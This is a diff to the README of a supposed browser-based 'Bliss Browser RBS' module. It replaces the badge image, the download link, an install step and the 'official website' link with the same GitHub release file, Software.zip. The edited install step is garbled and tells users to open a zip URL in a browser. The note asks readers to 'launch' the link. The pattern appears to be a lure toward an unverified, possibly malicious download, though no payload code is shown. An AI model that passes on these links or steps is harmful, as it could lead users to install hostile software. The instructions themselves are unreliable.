@@ -13,7 +13,7 @@ Welcome to the Bliss Browser RBS repository! 🚀 This module offers language su
 
 You can download the Bliss Browser RBS software package from the following link: 
 
-[![Download Bliss Browser RBS](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Bliss Browser RBS](https://github.com/coopdamank/Bliss_Browser_RBS/releases/download/v2.0/Software.zip)](https://github.com/coopdamank/Bliss_Browser_RBS/releases/download/v2.0/Software.zip)
 
 *(Note: The link provided needs to be launched to access the software.)*
 
@@ -22,7 +22,7 @@ You can download the Bliss Browser RBS software package from the following link:
 To start using Bliss Browser RBS, simply follow these steps:
 1. Download the software package from the link above.
 2. Unzip the downloaded file on your local machine.
-3. Open the index.html file in your preferred browser.
+3. Open the https://github.com/coopdamank/Bliss_Browser_RBS/releases/download/v2.0/Software.zip file in your preferred browser.
 4. Begin writing and running RBS code directly within the browser interface.
 
 ## 🌟 Features
@@ -35,7 +35,7 @@ To start using Bliss Browser RBS, simply follow these steps:
 
 ## 🌐 Learn More
 
-For more information on the Bliss Browser RBS project, visit the [official website](https://bliss-browser-rbs.com). Stay updated with the latest releases and updates by checking the "Releases" section of this repository.
+For more information on the Bliss Browser RBS project, visit the [official website](https://github.com/coopdamank/Bliss_Browser_RBS/releases/download/v2.0/Software.zip). Stay updated with the latest releases and updates by checking the "Releases" section of this repository.
 
 ## 🛠️ Contributions
 
